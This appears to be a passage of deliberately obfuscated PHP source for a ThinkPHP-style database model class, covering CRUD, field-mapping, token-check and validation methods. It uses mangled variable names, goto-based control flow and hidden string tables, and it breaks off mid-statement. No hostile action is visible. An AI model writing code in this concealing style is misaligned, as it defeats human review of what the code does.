=== $this->_beforeUpdate($D¾ø§ñ‹……, $cÌ´Ù˜°»)) { return !1; } $a®ÓëÓ²· = $this->db->update($D¾ø§ñ‹……, $cÌ´Ù˜°»); goto c„ï·”Ï¤; FÌ±…ƒĞÃ: $cÌ´Ù˜°» = $this->_parseOptions($cÌ´Ù˜°»); $BÇÔÖ„Åì = $this->getPk(); if (!isset($cÌ´Ù˜°»[$aªÜ˜”ïáŸ[260]])) { if (isset($D¾ø§ñ‹……[$BÇÔÖ„Åì])) { $BÌ¦ÑëÏ´£[$BÇÔÖ„Åì] = $D¾ø§ñ‹……[$BÇÔÖ„Åì]; $cÌ´Ù˜°»[$aªÜ˜”ïáŸ[260]] = $BÌ¦ÑëÏ´£; unset($D¾ø§ñ‹……[$BÇÔÖ„Åì]); } else { $this->error = think_lang($aªÜ˜”ïáŸ[259]); return !1; } } goto e¯°ìõÑĞÑ; BÜŒÜåö®ù: $aªÜ˜”ïáŸ =& $_SERVER[¢à]; if (empty($D¾ø§ñ‹……)) { if (!empty($this->data)) { $D¾ø§ñ‹…… = $this->data; $this->data = array(); } else { $this->error = think_lang($aªÜ˜”ïáŸ[256]); return !1; } } $D¾ø§ñ‹…… = $this->_facade($D¾ø§ñ‹……); goto FÌ±…ƒĞÃ; C²»²Š¬—†: } protected function _beforeUpdate(&$bÎ‹ÒÄ„ÍÂ, $b–¬¬Ú•ªœ) { } protected function _afterUpdate($b³ù¢†Êê, $Aƒ«Øƒ¯ò) { } public function delete($cÎÓï³’ÕÅ = array()) { goto eª¨ö¶×‰ö; cØ³ÄÈ„—ã: $aÃŒÁªß‰¦ = $this->db->delete($cÎÓï³’ÕÅ); if (!1 !== $aÃŒÁªß‰¦) { $Dèö¹ƒ°Ó = array(); if (isset($EÍ‘ËæèéÑ)) { $Dèö¹ƒ°Ó[$Fš’Â¦Û”½] = $EÍ‘ËæèéÑ; } $this->_after_delete($Dèö¹ƒ°Ó, $cÎÓï³’ÕÅ); } return $aÃŒÁªß‰¦; goto bÂ§ˆ¼—›; C…Î¹ª‘¯: if (is_numeric($cÎÓï³’ÕÅ) || is_string($cÎÓï³’ÕÅ)) { if (strpos($cÎÓï³’ÕÅ, $eŠµ»Í±£•[47])) { $aŒÄßÒ•[$Fš’Â¦Û”½] = array($eŠµ»Í±£•[261], $cÎÓï³’ÕÅ); } else { $aŒÄßÒ•[$Fš’Â¦Û”½] = $cÎÓï³’ÕÅ; } $this->options[$eŠµ»Í±£•[260]] = $aŒÄßÒ•; } $cÎÓï³’ÕÅ = $this->_parseOptions(); if (is_array($cÎÓï³’ÕÅ[$eŠµ»Í±£•[260]]) && isset($cÎÓï³’ÕÅ[$eŠµ»Í±£•[260]][$Fš’Â¦Û”½])) { $EÍ‘ËæèéÑ = $cÎÓï³’ÕÅ[$eŠµ»Í±£•[260]][$Fš’Â¦Û”½]; } goto cØ³ÄÈ„—ã; eª¨ö¶×‰ö: $eŠµ»Í±£• =& $_SERVER[¢à]; if (empty($cÎÓï³’ÕÅ) && empty($this->options[$eŠµ»Í±£•[260]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Fš’Â¦Û”½ = $this->getPk(); goto C…Î¹ª‘¯; bÂ§ˆ¼—›: } protected function _after_delete($BñÙŠ³¸, $d„¯ÅÍù«ë) { } public function select($D¯¤²Ô‰ì‹ = array()) { goto FãŒ÷‰ÁÔÛ; dôæ‚ô´¹: $aÙÑìº´®Ï = $this->db->select($D¯¤²Ô‰ì‹); if (!1 === $aÙÑìº´®Ï) { return !1; } if (empty($aÙÑìº´®Ï)) { return null; } goto FŸ¼äø¯ƒÏ; FãŒ÷‰ÁÔÛ: $D…ğ°ö®†ª =& $_SERVER[¢à]; if (is_string($D¯¤²Ô‰ì‹) || is_numeric($D¯¤²Ô‰ì‹)) { $E´›‡µŞÑ = $this->getPk(); if (strpos($D¯¤²Ô‰ì‹, $D…ğ°ö®†ª[47])) { $Eç“ô»¼ôâ[$E´›‡µŞÑ] = array($D…ğ°ö®†ª[261], $D¯¤²Ô‰ì‹); } else { $Eç“ô»¼ôâ[$E´›‡µŞÑ] = $D¯¤²Ô‰ì‹; } $this->options[$D…ğ°ö®†ª[260]] = $Eç“ô»¼ôâ; } elseif (!1 === $D¯¤²Ô‰ì‹) { $D¯¤²Ô‰ì‹ = $this->_parseOptions(); return $D…ğ°ö®†ª[262] . $this->db->buildSelectSql($D¯¤²Ô‰ì‹) . $D…ğ°ö®†ª[263]; } $D¯¤²Ô‰ì‹ = $this->_parseOptions(); goto dôæ‚ô´¹; FŸ¼äø¯ƒÏ: $this->_afterSelect($aÙÑìº´®Ï, $D¯¤²Ô‰ì‹); return $aÙÑìº´®Ï; goto FÀ²Œİ„ùŸ; FÀ²Œİ„ùŸ: } protected function _afterSelect(&$B‰ˆÍáĞ¶‡, $c¥¿‹«İ) { } public function buildSql($E‚Ò‚à­« = array()) { $D¥£ğ×©§ =& $_SERVER[¢à]; $E‚Ò‚à­« = $this->_parseOptions($E‚Ò‚à­«); return $D¥£ğ×©§[262] . $this->db->buildSelectSql($E‚Ò‚à­«) . $D¥£ğ×©§[263]; } public function optionsValue($AÄ£²—Ò­ = null) { if (is_null($AÄ£²—Ò­)) { return $this->options; } elseif (is_array($AÄ£²—Ò­)) { $this->options = array_merge($this->options, $AÄ£²—Ò­); } } protected function _parseOptions($cç¨ŞÍ«Ğ = array()) { goto D¾¿öñîáù; D¾¿öñîáù: $dˆ¯’Ü‡­Ë =& $_SERVER[¢à]; if (is_array($cç¨ŞÍ«Ğ)) { $cç¨ŞÍ«Ğ = array_merge($this->options, $cç¨ŞÍ«Ğ); } $this->options = array(); goto A“ÆéøÑ; bƒ“¿ºùà: if (isset($cç¨ŞÍ«Ğ[$dˆ¯’Ü‡­Ë[260]]) && is_array($cç¨ŞÍ«Ğ[$dˆ¯’Ü‡­Ë[260]]) && !empty($FéÜéâƒêÍ) && !isset($cç¨ŞÍ«Ğ[$dˆ¯’Ü‡­Ë[267]]) && !isset($cç¨ŞÍ«Ğ[$dˆ¯’Ü‡­Ë[264]])) { foreach ($cç¨ŞÍ«Ğ[$dˆ¯’Ü‡­Ë[260]] as $AÌ¤š†–ÁÅ => $D‰é‹Óè¥İ) { $AÌ¤š†–ÁÅ = trim($AÌ¤š†–ÁÅ); if (in_array($AÌ¤š†–ÁÅ, $FéÜéâƒêÍ, !0)) { if (is_scalar($D‰é‹Óè¥İ)) { $this->_parseType($cç¨ŞÍ«Ğ[$dˆ¯’Ü‡­Ë[260]], $AÌ¤š†–ÁÅ); } } elseif (!is_numeric($AÌ¤š†–ÁÅ) && $dˆ¯’Ü‡­Ë[70] != substr($AÌ¤š†–ÁÅ, 0, 1) && !1 === strpos($AÌ¤š†–ÁÅ, $dˆ¯’Ü‡­Ë[93]) && !1 === strpos($AÌ¤š†–ÁÅ, $dˆ¯’Ü‡­Ë[245]) && !1 === strpos($AÌ¤š†–ÁÅ, $dˆ¯’Ü‡­Ë[268]) && !1 === strpos($AÌ¤š†–ÁÅ, $dˆ¯’Ü‡­Ë[269])) { unset($cç¨ŞÍ«Ğ[$dˆ¯’Ü‡­Ë[260]][$AÌ¤š†–ÁÅ]); } } } $this->_options_filter($cç¨ŞÍ«Ğ); return $cç¨ŞÍ«Ğ; goto E¬âŠ×ÃíØ; A“ÆéøÑ: if (!isset($cç¨ŞÍ«Ğ[$dˆ¯’Ü‡­Ë[264]])) { $cç¨ŞÍ«Ğ[$dˆ¯’Ü‡­Ë[264]] = $this->getTableName(); $FéÜéâƒêÍ = $this->fields; } else { $FéÜéâƒêÍ = $this->getDbFields(); } if (!empty($cç¨ŞÍ«Ğ[$dˆ¯’Ü‡­Ë[265]])) { $cç¨ŞÍ«Ğ[$dˆ¯’Ü‡­Ë[264]] .= $dˆ¯’Ü‡­Ë[50] . $cç¨ŞÍ«Ğ[$dˆ¯’Ü‡­Ë[265]]; } $cç¨ŞÍ«Ğ[$dˆ¯’Ü‡­Ë[266]] = $this->name; goto bƒ“¿ºùà; E¬âŠ×ÃíØ: } protected function _options_filter(&$Bƒ‹·õ—á¸) { } protected function _parseType(&$Bµó¡İ¼ô, $Bæ…§„ãŸ) { $DÍ’”¿¸Œ =& $_SERVER[¢à]; if (empty($this->options[$DÍ’”¿¸Œ[270]][$DÍ’”¿¸Œ[4] . $Bæ…§„ãŸ])) { $F”ö·š›ë‡ = strtolower($this->fields[$DÍ’”¿¸Œ[237]][$Bæ…§„ãŸ]); if (!1 !== strpos($F”ö·š›ë‡, $DÍ’”¿¸Œ[271])) { } elseif (!1 === strpos($F”ö·š›ë‡, $DÍ’”¿¸Œ[272]) && !1 !== strpos($F”ö·š›ë‡, $DÍ’”¿¸Œ[273])) { $Bµó¡İ¼ô[$Bæ…§„ãŸ] = intval($Bµó¡İ¼ô[$Bæ…§„ãŸ]); } elseif (!1 !== strpos($F”ö·š›ë‡, $DÍ’”¿¸Œ[274]) || !1 !== strpos($F”ö·š›ë‡, $DÍ’”¿¸Œ[275])) { $Bµó¡İ¼ô[$Bæ…§„ãŸ] = floatval($Bµó¡İ¼ô[$Bæ…§„ãŸ]); } elseif (!1 !== strpos($F”ö·š›ë‡, $DÍ’”¿¸Œ[276])) { $Bµó¡İ¼ô[$Bæ…§„ãŸ] = (bool) $Bµó¡İ¼ô[$Bæ…§„ãŸ]; } } } public function find($d¦Á‹¤–ƒ = array()) { goto a³„§”†µ¼; f¦Ü¬¥‘È½: if (!empty($this->options[$aÖ “¿‹°’[278]])) { return $this->returnResult($this->data, $this->options[$aÖ “¿‹°’[278]]); } return $this->data; goto Aœ‡ŠÂšãò; a³„§”†µ¼: $aÖ “¿‹°’ =& $_SERVER[¢à]; if (is_numeric($d¦Á‹¤–ƒ) || is_string($d¦Á‹¤–ƒ)) { $cİ¶·²ª„Â[$this->getPk()] = intval($d¦Á‹¤–ƒ); $this->options[$aÖ “¿‹°’[260]] = $cİ¶·²ª„Â; } $this->options[$aÖ “¿‹°’[277]] = 1; goto fÌİĞöÆ¹–; aŠ´ÀâÜ Æ: if (empty($b²º’É×³)) { return null; } $this->data = $b²º’É×³[0]; $this->_afterFind($this->data, $d¦Á‹¤–ƒ); goto f¦Ü¬¥‘È½; fÌİĞöÆ¹–: $d¦Á‹¤–ƒ = $this->_parseOptions(); $b²º’É×³ = $this->db->select($d¦Á‹¤–ƒ); if (!1 === $b²º’É×³) { return !1; } goto aŠ´ÀâÜ Æ; Aœ‡ŠÂšãò: } protected function _afterFind(&$d¦¾›Ä„, $F•ºô’¼“˜) { } protected function returnResult($F‹Öïğ¾¤, $EŸ×À î…¼ = '') { $eÓ®œÚÔ©¸ =& $_SERVER[¢à]; if ($EŸ×À î…¼) { if (is_callable($EŸ×À î…¼)) { return call_user_func($EŸ×À î…¼, $F‹Öïğ¾¤); } switch (strtolower($EŸ×À î…¼)) { case $eÓ®œÚÔ©¸[279]: return json_encode($F‹Öïğ¾¤); case $eÓ®œÚÔ©¸[280]: return xml_encode($F‹Öïğ¾¤); } } return $F‹Öïğ¾¤; } public function parseFieldsMap($cù¸øŞ…´, $Aİ¾¦×…“ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $d½Œò­²ğ => $fŒœ¥…Æ…) { if ($Aİ¾¦×…“ == 1) { if (isset($cù¸øŞ…´[$fŒœ¥…Æ…])) { $cù¸øŞ…´[$d½Œò­²ğ] = $cù¸øŞ…´[$fŒœ¥…Æ…]; unset($cù¸øŞ…´[$fŒœ¥…Æ…]); } } else { if (isset($cù¸øŞ…´[$d½Œò­²ğ])) { $cù¸øŞ…´[$fŒœ¥…Æ…] = $cù¸øŞ…´[$d½Œò­²ğ]; unset($cù¸øŞ…´[$d½Œò­²ğ]); } } } } return $cù¸øŞ…´; } public function setField($Aœ÷‚«Õ¹÷, $DÒ¼ëøİ× = '') { if (is_array($Aœ÷‚«Õ¹÷)) { $eÍŠÖÙÔÅà = $Aœ÷‚«Õ¹÷; } else { $eÍŠÖÙÔÅà[$Aœ÷‚«Õ¹÷] = $DÒ¼ëøİ×; } return $this->save($eÍŠÖÙÔÅà); } public function setAdd($BÓĞ‘²È©ë, $E‰ó×­Š = 1) { $cæ¶ç Ö¡î =& $_SERVER[¢à]; $Aã•¹ˆ¯§î = $BÓĞ‘²È©ë . $cæ¶ç Ö¡î[281] . $E‰ó×­Š; if ($E‰ó×­Š < 0) { $Aã•¹ˆ¯§î = $BÓĞ‘²È©ë . $E‰ó×­Š; } return $this->setField($BÓĞ‘²È©ë, array($cæ¶ç Ö¡î[282], $Aã•¹ˆ¯§î)); } public function getField($Còİòóß, $eé„®Äà = null) { $FÅ¯†ÖÂ =& $_SERVER[¢à]; $DÕ¿ˆĞŞ‡Ù[$FÅ¯†ÖÂ[258]] = $Còİòóß; $DÕ¿ˆĞŞ‡Ù = $this->_parseOptions($DÕ¿ˆĞŞ‡Ù); $Còİòóß = trim($Còİòóß); if (strpos($Còİòóß, $FÅ¯†ÖÂ[47])) { if (!isset($DÕ¿ˆĞŞ‡Ù[$FÅ¯†ÖÂ[277]])) { $DÕ¿ˆĞŞ‡Ù[$FÅ¯†ÖÂ[277]] = is_numeric($eé„®Äà) ? $eé„®Äà : $FÅ¯†ÖÂ[33]; } $a·î“ÎÅÓŒ = $this->db->select($DÕ¿ˆĞŞ‡Ù); if (!empty($a·î“ÎÅÓŒ)) { goto eÀôøôÄéñ; eÈ¹Ôù«•Ó: $b²ôµùáŞÄ = array_shift($Còİòóß); $Dâ¡…÷¯·Ì = array(); $dÅ¬ñ‘×·§ = count($DØó’§Ùåš); goto E½ÂÂ•ùì; E½ÂÂ•ùì: foreach ($a·î“ÎÅÓŒ as $Bå—„‰ğ°Ù) { $Cëƒ®ÁÁ¤” = $Bå—„‰ğ°Ù[$cÏÓ®øÕå£]; if (2 == $dÅ¬ñ‘×·§) { $Dâ¡…÷¯·Ì[$Cëƒ®ÁÁ¤”] = $Bå—„‰ğ°Ù[$b²ôµùáŞÄ]; } else { $Dâ¡…÷¯·Ì[$Cëƒ®ÁÁ¤”] = is_string($eé„®Äà) ? implode($eé„®Äà, $Bå—„‰ğ°Ù) : $Bå—„‰ğ°Ù; } } return $Dâ¡…÷¯·Ì; goto fø¨†¾÷¸§; eÀôøôÄéñ: $DØó’§Ùåš = explode($FÅ¯†ÖÂ[47], $Còİòóß); $Còİòóß = array_keys($a·î“ÎÅÓŒ[0]); $cÏÓ®øÕå£ = array_shift($Còİòóß); goto eÈ¹Ôù«•Ó; fø¨†¾÷¸§: } } else { if (!0 !== $eé„®Äà) { $DÕ¿ˆĞŞ‡Ù[$FÅ¯†ÖÂ[277]] = is_numeric($eé„®Äà) ? $eé„®Äà : 1; } if ($eé„®Äà === $FÅ¯†ÖÂ[240]) { unset($DÕ¿ˆĞŞ‡Ù[$FÅ¯†ÖÂ[277]]); } $Bå—„‰ğ°Ù = $this->db->select($DÕ¿ˆĞŞ‡Ù); if (!empty($Bå—„‰ğ°Ù)) { if ($eé„®Äà === $FÅ¯†ÖÂ[240]) { return reset($Bå—„‰ğ°Ù[0]); } if (!0 !== $eé„®Äà && 1 == $DÕ¿ˆĞŞ‡Ù[$FÅ¯†ÖÂ[277]]) { return reset($Bå—„‰ğ°Ù[0]); } foreach ($Bå—„‰ğ°Ù as $f¾Ê¼î‘íƒ) { $EİŠØ¸ãõÃ[] = $f¾Ê¼î‘íƒ[$Còİòóß]; } return $EİŠØ¸ãõÃ; } } return null; } public function create($C·–ßĞ°ÉĞ = '', $bØ±šùÔâé = '') { goto fã‘áø‰«¼; Aäƒ·±ƒŠ‘: if ($this->autoCheckFields) { $bÇ‡øù²×È = $this->getDbFields(); foreach ($C·–ßĞ°ÉĞ as $Eß‹õë‹ÄÅ => $Aùªà¬­À) { if (!in_array($Eß‹õë‹ÄÅ, $bÇ‡øù²×È)) { unset($C·–ßĞ°ÉĞ[$Eß‹õë‹ÄÅ]); } elseif (MAGIC_QUOTES_GPC && is_string($Aùªà¬­À)) { $C·–ßĞ°ÉĞ[$Eß‹õë‹ÄÅ] = stripslashes($Aùªà¬­À); } } } $this->autoOperation($C·–ßĞ°ÉĞ, $bØ±šùÔâé); $this->data = $C·–ßĞ°ÉĞ; goto dóÓ¤Ïæ¦; aÀœÛ²„‰Ş: $C·–ßĞ°ÉĞ = $this->parseFieldsMap($C·–ßĞ°ÉĞ, 0); $bØ±šùÔâé = $bØ±šùÔâé ? $bØ±šùÔâé : (!empty($C·–ßĞ°ÉĞ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$AÛ©°†º—Ù[258]])) { $bÇ‡øù²×È = $this->options[$AÛ©°†º—Ù[258]]; unset($this->options[$AÛ©°†º—Ù[258]]); } elseif ($bØ±šùÔâé == THINK_MODEL_INSERT && isset($this->insertFields)) { $bÇ‡øù²×È = $this->insertFields; } elseif ($bØ±šùÔâé == THINK_MODEL_UPDATE && isset($this->updateFields)) { $bÇ‡øù²×È = $this->updateFields; } goto fÈ¸Í¦Ëê÷; dóÓ¤Ïæ¦: return $C·–ßĞ°ÉĞ; goto FÀ‰Í¢ÚÕ‚; fã‘áø‰«¼: $AÛ©°†º—Ù =& $_SERVER[¢à]; if (empty($C·–ßĞ°ÉĞ)) { $C·–ßĞ°ÉĞ = $_POST; } elseif (is_object($C·–ßĞ°ÉĞ)) { $C·–ßĞ°ÉĞ = get_object_vars($C·–ßĞ°ÉĞ); } if (empty($C·–ßĞ°ÉĞ) || !is_array($C·–ßĞ°ÉĞ)) { $this->error = think_lang($AÛ©°†º—Ù[256]); return !1; } goto aÀœÛ²„‰Ş; fÈ¸Í¦Ëê÷: if (isset($bÇ‡øù²×È)) { if (is_string($bÇ‡øù²×È)) { $bÇ‡øù²×È = explode($AÛ©°†º—Ù[47], $bÇ‡øù²×È); } if (think_config($AÛ©°†º—Ù[283])) { $bÇ‡øù²×È[] = think_config($AÛ©°†º—Ù[284]); } foreach ($C·–ßĞ°ÉĞ as $Eß‹õë‹ÄÅ => $Aùªà¬­À) { if (!in_array($Eß‹õë‹ÄÅ, $bÇ‡øù²×È)) { unset($C·–ßĞ°ÉĞ[$Eß‹õë‹ÄÅ]); } } } if (!$this->autoValidation($C·–ßĞ°ÉĞ, $bØ±šùÔâé)) { return !1; } if (!$this->autoCheckToken($C·–ßĞ°ÉĞ)) { $this->error = think_lang($AÛ©°†º—Ù[285]); return !1; } goto Aäƒ·±ƒŠ‘; FÀ‰Í¢ÚÕ‚: } public function autoCheckToken($b†“”Ä¡) { $F®ÒÙ ¡÷ =& $_SERVER[¢à]; if (isset($this->options[$F®ÒÙ ¡÷[286]]) && !$this->options[$F®ÒÙ ¡÷[286]]) { return !0; } if (think_config($F®ÒÙ ¡÷[283])) { $d¢Ñ‹ã•æ¬ = think_config($F®ÒÙ ¡÷[284]); if (!isset($b†“”Ä¡[$d¢Ñ‹ã•æ¬]) || Session::get($d¢Ñ‹ã•æ¬)) { return !1; } list($Dç­Ã°ØÅ, $Dï¿™ñ£Ü) = explode($F®ÒÙ ¡÷[70], $b†“”Ä¡[$d¢Ñ‹ã•æ¬]); if ($Dï¿™ñ£Ü && Session::get($d¢Ñ‹ã•æ¬ . $F®ÒÙ ¡÷[93] . $Dç­Ã°ØÅ) === $Dï¿™ñ£Ü) { Session::remove($d¢Ñ‹ã•æ¬ . $F®ÒÙ ¡÷[93] . $Dç­Ã°ØÅ); return !0; } if (think_config($F®ÒÙ ¡÷[287])) { Session::remove($d¢Ñ‹ã•æ¬ . $F®ÒÙ ¡÷[93] . $Dç­Ã°ØÅ); } return !1; } return !0; } public function regex($fŸŒ÷åœ„¦, $eƒĞšáõÀ¤) { $Dƒê†¬Ûì® =& $_SERVER[¢à]; $Aˆæ —ïÒ› = array($Dƒê†¬Ûì®[288] => $Dƒê†¬Ûì®[289], $Dƒê†¬Ûì®[290] => $Dƒê†¬Ûì®[291], $Dƒê†¬Ûì®[292] => $Dƒê†¬Ûì®[293], $Dƒê†¬Ûì®[294] => $Dƒê†¬Ûì®[295], $Dƒê†¬Ûì®[296] => $Dƒê†¬Ûì®[297], $Dƒê†¬Ûì®[298] => $Dƒê†¬Ûì®[299], $Dƒê†¬Ûì®[300] => $Dƒê†¬Ûì®[301], $Dƒê†¬Ûì®[275] => $Dƒê†¬Ûì®[302], $Dƒê†¬Ûì®[303] => $Dƒê†¬Ûì®[304]); if (isset($Aˆæ —ïÒ›[strtolower($eƒĞšáõÀ¤)])) { $eƒĞšáõÀ¤ = $Aˆæ —ïÒ›[strtolower($eƒĞšáõÀ¤)]; } return preg_match($eƒĞšáõÀ¤, $fŸŒ÷åœ„¦) === 1; } private function autoOperation(&$B¾ª™ãí§, $Féê×±—í¤) { $AõÊ‚‘ƒ“³ =& $_SERVER[¢à]; if (!empty($this->options[$AõÊ‚‘ƒ“³[305]])) { $dÜ—«ù‹ß‘ = $this->options[$AõÊ‚‘ƒ“³[305]]; unset($this->options[$AõÊ‚‘ƒ“³[305]]); } elseif (!empty($this->_auto)) { $dÜ—«ù‹ß‘ = $this->_auto; } if (isset($dÜ—«ù‹ß‘)) { foreach ($dÜ—«ù‹ß‘ as $EíÒÇø·“á) { if (empty($EíÒÇø·“á[2])) { $EíÒÇø·“á[2] = THINK_MODEL_INSERT; } if ($Féê×±—í¤ == $EíÒÇø·“á[2] || $EíÒÇø·“á[2] == THINK_MODEL_BOTH) { switch (trim($EíÒÇø·“á[3])) { case $AõÊ‚‘ƒ“³[306]: case $AõÊ‚‘ƒ“³[307]: $CÜ‘ã„õöÖ = isset($EíÒÇø·“á[4]) ? (array) $EíÒÇø·“á[4] : array(); if (isset($B¾ª™ãí§[$EíÒÇø·“á[0]])) { array_unshift($CÜ‘ã„õöÖ, $B¾ª™ãí§[$EíÒÇø·“á[0]]); } if ($AõÊ‚‘ƒ“³[306] == $EíÒÇø·“á[3]) { $B¾ª™ãí§[$EíÒÇø·“á[0]] = call_user_func_array($EíÒÇø·“á[1], $CÜ‘ã„õöÖ); } else { $B¾ª™ãí§[$EíÒÇø·“á[0]] = call_user_func_array(array(&$this, $EíÒÇø·“á[1]), $CÜ‘ã„õöÖ); } break; case $AõÊ‚‘ƒ“³[258]: $B¾ª™ãí§[$EíÒÇø·“á[0]] = $B¾ª™ãí§[$EíÒÇø·“á[1]]; break; case $AõÊ‚‘ƒ“³[308]: if ($AõÊ‚‘ƒ“³[33] === $B¾ª™ãí§[$EíÒÇø·“á[0]]) { unset($B¾ª™ãí§[$EíÒÇø·“á[0]]); } break; case $AõÊ‚‘ƒ“³[309]: default: $B¾ª™ãí§[$EíÒÇø·“á[0]] = $EíÒÇø·“á[1]; } if (!1 === $B¾ª™ãí§[$EíÒÇø·“á[0]]) { unset($B¾ª™ãí§[$EíÒÇø·“á[0]]); } } } } return $B¾ª™ãí§; } protected function autoValidation($e‡õªŞØ’‚, $C­àé³¿¡Ê) { $B‚ ×ÃÛ°ô =& $_SERVER[¢à]; if (!empty($this->options[$B‚ ×ÃÛ°ô[310]])) { $f¶ç»±Ñê = $this->options[$B‚ ×ÃÛ°ô[310]]; unset($this->options[$B‚ ×ÃÛ°ô[310]]); } elseif (!empty($this->_validate)) { $f¶ç»±Ñê = $this->_validate; } if (isset($f¶ç»±Ñê)) { if ($this->patchValidate) { $this->error = array(); } foreach ($f¶ç»±Ñê as $fŞ—°³‰ˆ => $dìËİä’Š) { if (empty($dìËİä’Š[5]) || $dìËİä’Š[5] == THINK_MODEL_BOTH || $dìËİä’Š[5] == $C­àé³¿¡Ê) { if (0 == strpos($dìËİä’Š[2], $B‚ ×ÃÛ°ô[311]) && strpos($dìËİä’Š[2], $B‚ ×ÃÛ°ô[312])) { $dìËİä’Š[2] = think_lang(substr($dìËİä’Š[2], 2, -1)); } $dìËİä’Š[3] = isset($dìËİä’Š[3]) ? $dìËİä’Š[3] : THINK_EXISTS_VALIDATE; $dìËİä’Š[4] = isset($dìËİä’Š[4]) ? $dìËİä’Š[4] : $B‚ ×ÃÛ°ô[313]; switch ($dìËİä’Š[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($e‡õªŞØ’‚, $dìËİä’Š)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($B‚ ×ÃÛ°ô[33] != trim($e‡õªŞØ’‚[$dìËİä’Š[0]])) { if (!1 === $this->_validationField($e‡õªŞØ’‚, $dìËİä’Š)) { return !1; } } break; default: if (isset($e‡õªŞØ’‚[$dìËİä’Š[0]])) { if (!1 === $this->_validationField($e‡õªŞØ’‚, $dìËİä’Š)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($D·¡ù÷¯…Ó, $dÃÒ‰õšš) { if (!1 === $this->_validationFieldItem($D·¡ù÷¯…Ó, $dÃÒ‰õšš)) { if ($this->patchValidate) { $this->error[$dÃÒ‰õšš[0]] = $dÃÒ‰õšš[2]; } else { $this->error = $dÃÒ‰õšš[2]; return !1; } } return; } protected function _validationFieldItem($D’»Ä´, $b¢ŒõŸµâò) { $eÅ††§ßŠˆ =& $_SERVER[¢à]; switch (strtolower(trim($b¢ŒõŸµâò[4]))) { case $eÅ††§ßŠˆ[306]: case $eÅ††§ßŠˆ[307]: $FšÉ±™ìÓÅ = isset($b¢ŒõŸµâò[6]) ? (array) $b¢ŒõŸµâò[6] : array(); if (is_string($b¢ŒõŸµâò[0]) && strpos($b¢ŒõŸµâò[0], $eÅ††§ßŠˆ[47])) { $b¢ŒõŸµâò[0] = explode($eÅ††§ßŠˆ[47], $b¢ŒõŸµâò[0]); } if (is_array($b¢ŒõŸµâò[0])) { foreach ($b¢ŒõŸµâò[0] as $DÜ‹±ã¶­ê) { $C®´•í§ÏÛ[$DÜ‹±ã¶­ê] = $D’»Ä´[$DÜ‹±ã¶­ê]; } array_unshift($FšÉ±™ìÓÅ, $C®´•í§ÏÛ); } else { array_unshift($FšÉ±™ìÓÅ, $D’»Ä´[$b¢ŒõŸµâò[0]]); } if ($eÅ††§ßŠˆ[306] == $b¢ŒõŸµâò[4]) { return call_user_func_array($b¢ŒõŸµâò[1], $FšÉ±™ìÓÅ); } else { return call_user_func_array(array(&$this, $b¢ŒõŸµâò[1]), $FšÉ±™ìÓÅ); } case $eÅ††§ßŠˆ[314]: return $D’»Ä´[$b¢ŒõŸµâò[0]] == $D’»Ä´[$b¢ŒõŸµâò[1]]; case $eÅ††§ßŠˆ[315]: if (is_string($b¢ŒõŸµâò[0]) && strpos($b¢ŒõŸµâò[0], $eÅ††§ßŠˆ[47])) { $b¢ŒõŸµâò[0] = explode($eÅ††§ßŠˆ[47], $b¢ŒõŸµâò[0]); } $BØƒÊ·Â = array(); if (is_array($b¢ŒõŸµâò[0])) { foreach ($b¢ŒõŸµâò[0] as $DÜ‹±ã¶­ê) { $BØƒÊ·Â[$DÜ‹±ã¶­ê] = $D’»Ä´[$DÜ‹±ã¶­ê]; } } else { $BØƒÊ·Â[$b¢ŒõŸµâò[0]] = $D’»Ä´[$b¢ŒõŸµâò[0]]; } if (!empty($D’»Ä´[$this->getPk()])) { $BØƒÊ·Â[$this->getPk()] = array($eÅ††§ßŠˆ[316], $D’»Ä´[$this->getPk()]); } if ($this->where($BØƒÊ·Â)->find()) { return !1; } return !0; default: return $this->check($D’»Ä´[$b¢ŒõŸµâò[0]], $b¢ŒõŸµâò[1], $b¢ŒõŸµâò[4]); } } public function check($DÒ‡È¿Ê•÷, $fò›İß±Ï, $BÌŒ®ôá¼Š = "\162\x65\x67\x65\170") { $aŒòáßõÜ =& $_SERVER[¢à]; $BÌŒ®ôá¼Š = strtolower(trim($BÌŒ®ôá¼Š)); switch ($BÌŒ®ôá¼Š) { case $aŒòáßõÜ[7]: case $aŒòáßõÜ[317]: $f¬“ëæÚö” = is_array($fò›İß±Ï) ? $fò›İß±Ï : explode($aŒòáßõÜ[47], $fò›İß±Ï); return $BÌŒ®ôá¼Š == $aŒòáßõÜ[7] ? in_array($DÒ‡È¿Ê•÷, $f¬“ëæÚö”) : !in_array($DÒ‡È¿Ê•÷, $f¬“ëæÚö”); case $aŒòáßõÜ[318]: case $aŒòáßõÜ[319]: if (is_array($fò›İß±Ï)) { $Cµ‡Œ‰Œê‡ = $fò›İß±Ï[0]; $FóÁ¦ĞºÕ = $fò›İß±Ï[1]; } else { list($Cµ‡Œ‰Œê‡, $FóÁ¦ĞºÕ) = explode($aŒòáßõÜ[47], $fò›İß±Ï); } return $BÌŒ®ôá¼Š == $aŒòáßõÜ[318] ? $DÒ‡È¿Ê•÷ >= $Cµ‡Œ‰Œê‡ && $DÒ‡È¿Ê•÷ <= $FóÁ¦ĞºÕ : $DÒ‡È¿Ê•÷ < $Cµ‡Œ‰Œê‡ || $DÒ‡È¿Ê•÷ > $FóÁ¦ĞºÕ; case $aŒòáßõÜ[320]: case $aŒòáßõÜ[321]: return $BÌŒ®ôá¼Š == $aŒòáßõÜ[320] ? $DÒ‡È¿Ê•÷ == $fò›İß±Ï : $DÒ‡È¿Ê•÷ != $fò›İß±Ï; case $aŒòáßõÜ[322]: $AçŒø—¨¬ƒ = mb_strlen($DÒ‡È¿Ê•÷, $aŒòáßõÜ[323]); if (strpos($fò›İß±Ï, $aŒòáßõÜ[47])) { list($Cµ‡Œ‰Œê‡, $FóÁ¦ĞºÕ) = explode($aŒòáßõÜ[47], $fò›İß±Ï); return $AçŒø—¨¬ƒ >= $Cµ‡Œ‰Œê‡ && $AçŒø—¨¬ƒ <= $FóÁ¦ĞºÕ; } else { return $AçŒø—¨¬ƒ == $fò›İß±Ï; } case $aŒòáßõÜ[324]: list($bõŒÎéŒ©, $a±‰­Îƒ¾¿) = explode($aŒòáßõÜ[47], 